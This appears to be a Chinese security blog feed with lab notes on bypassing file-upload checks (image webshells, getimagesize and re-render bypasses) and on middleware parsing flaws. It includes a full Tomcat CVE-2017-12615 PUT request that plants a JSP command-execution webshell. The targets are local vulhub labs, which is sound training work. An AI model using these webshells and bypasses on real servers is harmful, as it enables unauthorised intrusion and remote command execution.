        <content type="html"><![CDATA[<h2 id="WEB漏洞-文件上传之内容逻辑数组绕过"><a href="#WEB漏洞-文件上传之内容逻辑数组绕过" class="headerlink" title="WEB漏洞-文件上传之内容逻辑数组绕过"></a><font size="6"><strong>WEB漏洞-文件上传之内容逻辑数组绕过</strong></font></h2><span id="more"></span><p><img src="/2023/10/05/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-022/1.png"></p><pre class=" language-bash"><code class="language-bash">copy 1.png /b + shell.php /a webshell.jpg文件头检测图像文件信息判断逻辑安全<span class="token operator">=</span>二次渲染逻辑安全-条件竞争目录命名-x.php/.脚本函数漏洞-CVE-2015-2348数组接受+目录命名</code></pre><p>copy 1.png &#x2F;b + shell.php &#x2F;a webshell.jpg意思是将shell.php中的代码追加到1.png中并重新生成一个叫webshell.php的代码。</p><h3 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a><font size="5"><strong>第十三关</strong></font></h3><p>用上面的代码制作成图片马然后正常上传，获取到图片的地址。然后打开文件包含漏洞页面<br><img src="/2023/10/05/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-022/2.png"></p><p>将刚才上传的图片作为参数发送给服务器。然后获取到webshell<br><img src="/2023/10/05/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-022/3.png"></p><p>也可以用蚁剑这种工具拿下webshell<br><img src="/2023/10/05/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-022/4.png"></p><h3 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a><font size="5"><strong>第十四关</strong></font></h3><pre class=" language-bash"><code class="language-bash"><span class="token keyword">function</span> isImage<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    <span class="token variable">$types</span> <span class="token operator">=</span> <span class="token string">'.jpeg|.png|.gif'</span><span class="token punctuation">;</span>    if<span class="token punctuation">(</span>file_exists<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        <span class="token variable">$info</span> <span class="token operator">=</span> getimagesize<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ext</span> <span class="token operator">=</span> image_type_to_extension<span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span>2<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        if<span class="token punctuation">(</span>stripos<span class="token punctuation">(</span><span class="token variable">$types</span>,<span class="token variable">$ext</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>            <span class="token keyword">return</span> <span class="token variable">$ext</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;else&amp;#123;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;else&amp;#123;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> null<span class="token punctuation">;</span>if<span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> isImage<span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    if<span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"文件未知，上传失败！"</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;else&amp;#123;</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> UPLOAD_PATH.<span class="token string">"/"</span>.rand<span class="token punctuation">(</span>10, 99<span class="token punctuation">)</span>.date<span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span>.<span class="token variable">$res</span><span class="token punctuation">;</span>        if<span class="token punctuation">(</span>move_uploaded_file<span class="token punctuation">(</span><span class="token variable">$temp_file</span>,<span class="token variable">$img_path</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"上传出错！"</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span></code></pre><p>getimagesize代码的核心就是使用这个函数这个函数会对文件头进行验证，比如GIF的文件头问GIF89apng的文件头为塒NG，所以此处正常上传一个图片马将后缀改名为PHP即可<br><img src="/2023/10/05/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-022/5.png"><br><img src="/2023/10/05/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-022/6.png"></p><h3 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a><font size="5"><strong>第十五关</strong></font></h3><p>和上面的一关基本是一样的只需要正常的上传然后结合文件包含漏洞利用。</p><h3 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关"></a><font size="5"><strong>第十六关</strong></font></h3><p><a href="https://xz.aliyun.com/t/2657#toc-13">https://xz.aliyun.com/t/2657#toc-13</a><br><a href="https://blog.csdn.net/m0_46436640/article/details/107809772">https://blog.csdn.net/m0_46436640/article/details/107809772</a><br>这一关的难度相对来说比较大，因为文件的验证比较复杂。</p><pre class=" language-bash"><code class="language-bash"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> null<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$filetype</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$tmpname</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$target_path</span><span class="token operator">=</span>UPLOAD_PATH.basename<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    // 获得上传文件的扩展名    <span class="token variable">$fileext</span><span class="token operator">=</span> substr<span class="token punctuation">(</span>strrchr<span class="token punctuation">(</span><span class="token variable">$filename</span>,<span class="token string">"."</span><span class="token punctuation">)</span>,1<span class="token punctuation">)</span><span class="token punctuation">;</span>    //判断文件后缀与类型，合法才进行上传操作    if<span class="token punctuation">((</span><span class="token variable">$fileext</span> <span class="token operator">==</span> <span class="token string">"jpg"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$filetype</span><span class="token operator">==</span><span class="token string">"image/jpeg"</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        if<span class="token punctuation">(</span>move_uploaded_file<span class="token punctuation">(</span><span class="token variable">$tmpname</span>,<span class="token variable">$target_path</span><span class="token punctuation">))</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>            //使用上传的图片生成新的图片            <span class="token variable">$im</span> <span class="token operator">=</span> imagecreatefromjpeg<span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            if<span class="token punctuation">(</span><span class="token variable">$im</span> <span class="token operator">==</span> false<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"该文件不是jpg格式的图片！"</span><span class="token punctuation">;</span>                @unlink<span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;else&amp;#123;</span>                //给新图片指定文件名                srand<span class="token punctuation">(</span>time<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>                <span class="token variable">$newfilename</span> <span class="token operator">=</span> strval<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">))</span>.<span class="token string">".jpg"</span><span class="token punctuation">;</span>                <span class="token variable">$newimagepath</span> <span class="token operator">=</span> UPLOAD_PATH.<span class="token variable">$newfilename</span><span class="token punctuation">;</span>                imagejpeg<span class="token punctuation">(</span><span class="token variable">$im</span>,<span class="token variable">$newimagepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                //显示二次渲染后的图片（使用用户上传图片生成的新图片）                <span class="token variable">$img_path</span> <span class="token operator">=</span> UPLOAD_PATH.<span class="token variable">$newfilename</span><span class="token punctuation">;</span>                @unlink<span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"上传出错！"</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;else if(($fileext == "png") &amp;&amp; ($filetype=="image/png"))&amp;#123;</span>        if<span class="token punctuation">(</span>move_uploaded_file<span class="token punctuation">(</span><span class="token variable">$tmpname</span>,<span class="token variable">$target_path</span><span class="token punctuation">))</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>            //使用上传的图片生成新的图片            <span class="token variable">$im</span> <span class="token operator">=</span> imagecreatefrompng<span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            if<span class="token punctuation">(</span><span class="token variable">$im</span> <span class="token operator">==</span> false<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"该文件不是png格式的图片！"</span><span class="token punctuation">;</span>                @unlink<span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;else&amp;#123;</span>                 //给新图片指定文件名                srand<span class="token punctuation">(</span>time<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>                <span class="token variable">$newfilename</span> <span class="token operator">=</span> strval<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">))</span>.<span class="token string">".png"</span><span class="token punctuation">;</span>                <span class="token variable">$newimagepath</span> <span class="token operator">=</span> UPLOAD_PATH.<span class="token variable">$newfilename</span><span class="token punctuation">;</span>                imagepng<span class="token punctuation">(</span><span class="token variable">$im</span>,<span class="token variable">$newimagepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                //显示二次渲染后的图片（使用用户上传图片生成的新图片）                <span class="token variable">$img_path</span> <span class="token operator">=</span> UPLOAD_PATH.<span class="token variable">$newfilename</span><span class="token punctuation">;</span>                @unlink<span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                           <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"上传出错！"</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;else if(($fileext == "gif") &amp;&amp; ($filetype=="image/gif"))&amp;#123;</span>        if<span class="token punctuation">(</span>move_uploaded_file<span class="token punctuation">(</span><span class="token variable">$tmpname</span>,<span class="token variable">$target_path</span><span class="token punctuation">))</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>            //使用上传的图片生成新的图片            <span class="token variable">$im</span> <span class="token operator">=</span> imagecreatefromgif<span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            if<span class="token punctuation">(</span><span class="token variable">$im</span> <span class="token operator">==</span> false<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"该文件不是gif格式的图片！"</span><span class="token punctuation">;</span>                @unlink<span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;else&amp;#123;</span>                //给新图片指定文件名                srand<span class="token punctuation">(</span>time<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>                <span class="token variable">$newfilename</span> <span class="token operator">=</span> strval<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">))</span>.<span class="token string">".gif"</span><span class="token punctuation">;</span>                <span class="token variable">$newimagepath</span> <span class="token operator">=</span> UPLOAD_PATH.<span class="token variable">$newfilename</span><span class="token punctuation">;</span>                imagegif<span class="token punctuation">(</span><span class="token variable">$im</span>,<span class="token variable">$newimagepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                //显示二次渲染后的图片（使用用户上传图片生成的新图片）                <span class="token variable">$img_path</span> <span class="token operator">=</span> UPLOAD_PATH.<span class="token variable">$newfilename</span><span class="token punctuation">;</span>                @unlink<span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"上传出错！"</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;else&amp;#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"只允许上传后缀为.jpg|.png|.gif的图片文件！"</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span></code></pre><p>先上传一张图片马然后下载，将下载的图片马和原先的图片进行对比，发现没有被渲染的位置插入PHP代码最后在上传，再下载观察PHP代码是否被渲染。<br><img src="/2023/10/05/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-022/7.png"><br><img src="/2023/10/05/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-022/8.png"><br><img src="/2023/10/05/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-022/9.png"></p><h3 id="第十七关"><a href="#第十七关" class="headerlink" title="第十七关"></a><font size="5"><strong>第十七关</strong></font></h3><h3 id="中间件解析漏洞"><a href="#中间件解析漏洞" class="headerlink" title="中间件解析漏洞"></a><font size="5"><strong>中间件解析漏洞</strong></font></h3><p><img src="/2023/10/05/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-022/10.png"></p><h4 id="1-tomcat文件解析漏洞"><a href="#1-tomcat文件解析漏洞" class="headerlink" title="1.tomcat文件解析漏洞"></a><font size="4"><strong>1.tomcat文件解析漏洞</strong></font></h4><p>CVE-2017-12615<br>环境搭建<a href="https://vulhub.org/#/environments/tomcat/CVE-2017-12615/">https://vulhub.org/#/environments/tomcat/CVE-2017-12615/</a></p><pre class=" language-bash"><code class="language-bash">jiang@ubuntu:/opt/vulhub/vulhub-master/tomcat/CVE-2017-12615$ docker-compose up -d</code></pre><p><img src="/2023/10/05/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-022/11.png"></p><p>burp修改数据包</p><pre class=" language-bash"><code class="language-bash">PUT /1.jsp/ HTTP/1.1Host: 10.1.1.7:8080Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 <span class="token punctuation">(</span>compatible<span class="token punctuation">;</span> MSIE 9.0<span class="token punctuation">;</span> Windows NT 6.1<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">;</span> Trident/5.0<span class="token punctuation">)</span>Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 750<span class="token operator">&lt;</span>%@ page language<span class="token operator">=</span><span class="token string">"java"</span> import<span class="token operator">=</span><span class="token string">"java.util.*,java.io.*"</span> pageEncoding<span class="token operator">=</span><span class="token string">"UTF-8"</span>%<span class="token operator">></span>         <span class="token operator">&lt;</span>%<span class="token operator">!</span>public static String excuteCmd<span class="token punctuation">(</span>String c<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>         StringBuilder line <span class="token operator">=</span> new StringBuilder<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         try <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));</span>         String temp <span class="token operator">=</span> null<span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token variable"><span class="token punctuation">((</span>temp <span class="token operator">=</span> buf.readLine<span class="token punctuation">(</span><span class="token punctuation">))</span></span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>         line.append<span class="token punctuation">(</span>temp+<span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;buf.close();&amp;#125; catch (Exception e) &amp;#123;</span>         line.append<span class="token punctuation">(</span>e.getMessage<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;return line.toString();&amp;#125;%>&lt;%if("023".equals(request.getParameter("pwd"))&amp;&amp;!"".equals(request.getParameter("cmd")))&amp;#123;</span>         out.println<span class="token punctuation">(</span><span class="token string">"&lt;pre>"</span>+excuteCmd<span class="token punctuation">(</span>request.getParameter<span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">))</span>+<span class="token string">"&lt;/pre>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;else&amp;#123;out.println(":-)");&amp;#125;%></span></code></pre><p>访问<a href="http://10.1.1.7:8080/1.jsp?&pwd=023&cmd=id">http://10.1.1.7:8080/1.jsp?&amp;pwd=023&amp;cmd=id</a><br><img src="/2023/10/05/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-022/12.png"><br><img src="/2023/10/05/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-022/13.png"></p><h4 id="2-nginx解析漏洞"><a href="#2-nginx解析漏洞" class="headerlink" title="2.nginx解析漏洞"></a><font size="4"><strong>2.nginx解析漏洞</strong></font></h4><p>环境搭建:<a href="https://vulhub.org/#/environments/nginx/nginx_parsing_vulnerability/">https://vulhub.org/#/environments/nginx/nginx_parsing_vulnerability/</a></p><pre class=" language-bash"><code class="language-bash">jiang@ubuntu:/opt/vulhub/vulhub-master/nginx/nginx_parsing_vulnerability$ <span class="token function">pwd</span>/opt/vulhub/vulhub-master/nginx/nginx_parsing_vulnerabilityjiang@ubuntu:/opt/vulhub/vulhub-master/nginx/nginx_parsing_vulnerability$ docker-compose up -d</code></pre><p><img src="/2023/10/05/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-022/14.png"></p><p>然后在URL后面添加&#x2F;xx.php 文件名随便<br><img src="/2023/10/05/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-022/15.png"></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-021</title>
      <link href="/2023/10/04/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-021/"/>
      <url>/2023/10/04/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-021/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-文件上传之后端黑白名单绕过"><a href="#WEB漏洞-文件上传之后端黑白名单绕过" class="headerlink" title="WEB漏洞-文件上传之后端黑白名单绕过"></a><font size="6"><strong>WEB漏洞-文件上传之后端黑白名单绕过</strong></font></h2><span id="more"></span><p><img src="/2023/10/04/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-021/1.png"></p><pre class=" language-bash"><code class="language-bash">文件上传常见验证:后缀名，类型，文件头等后缀名:黑名单,白名单文件类型:MIME信息文件头:内容头信息简要上传表单代码分析解释</code></pre><p><a href="https://www.jianshu.com/p/befa8f0ad5c8">https://www.jianshu.com/p/befa8f0ad5c8</a><br><a href="https://blog.csdn.net/m0_46436640/article/details/107809772">https://blog.csdn.net/m0_46436640/article/details/107809772</a></p><h3 id="PHP函数"><a href="#PHP函数" class="headerlink" title="PHP函数"></a><font size="5"><strong>PHP函数</strong></font></h3><pre class=" language-bash"><code class="language-bash">trim<span class="token punctuation">(</span><span class="token punctuation">)</span> 函数移除字符串两侧的空白字符或其他预定义字符。str_ireplace<span class="token punctuation">(</span><span class="token punctuation">)</span> 函数替换字符串中的一些字符（不区分大小写）。substr<span class="token punctuation">(</span><span class="token punctuation">)</span> 函数返回字符串的一部分。strrpos<span class="token punctuation">(</span><span class="token punctuation">)</span> 函数查找字符串在另一字符串中最后一次出现的位置。</code></pre><h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a><font size="5"><strong>第一关</strong></font></h3><pre class=" language-bash"><code class="language-bash"><span class="token keyword">function</span> checkFile<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    var <span class="token function">file</span> <span class="token operator">=</span> document.getElementsByName<span class="token punctuation">(</span><span class="token string">'upload_file'</span><span class="token punctuation">)</span><span class="token punctuation">[</span>0<span class="token punctuation">]</span>.value<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>file <span class="token operator">==</span> null <span class="token operator">||</span> <span class="token function">file</span> <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        alert<span class="token punctuation">(</span><span class="token string">"请选择要上传的文件!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    //定义允许上传的文件类型    var allow_ext <span class="token operator">=</span> <span class="token string">".jpg|.png|.gif"</span><span class="token punctuation">;</span>    //提取上传文件的类型    var ext_name <span class="token operator">=</span> file.substring<span class="token punctuation">(</span>file.lastIndexOf<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">))</span><span class="token punctuation">;</span>    //判断上传文件类型是否允许上传    <span class="token keyword">if</span> <span class="token punctuation">(</span>allow_ext.indexOf<span class="token punctuation">(</span>ext_name + <span class="token string">"|"</span><span class="token punctuation">)</span> <span class="token operator">==</span> -1<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        var errMsg <span class="token operator">=</span> <span class="token string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="token string">"类型的文件,当前文件类型为："</span> + ext_name<span class="token punctuation">;</span>        alert<span class="token punctuation">(</span>errMsg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span></code></pre><p>只是后缀的验证抓包修改后缀即可</p><p>创建php.png文件里面写入内容,然后上传burp抓包将php.png修改为php.php,再把数据包发送，最后在浏览器中右击复制文件地址</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?phpphpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span></code></pre><p><img src="/2023/10/04/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-021/2.png"><br><img src="/2023/10/04/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-021/3.png"></p><h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a><font size="5"><strong>第二关</strong></font></h3><pre class=" language-bash"><code class="language-bash"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> null<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>file_exists<span class="token punctuation">(</span>UPLOAD_PATH<span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">((</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'image/jpeg'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'image/png'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'image/gif'</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> UPLOAD_PATH <span class="token keyword">.</span> <span class="token string">'/'</span> <span class="token keyword">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>move_uploaded_file<span class="token punctuation">(</span><span class="token variable">$temp_file</span>, <span class="token variable">$img_path</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token 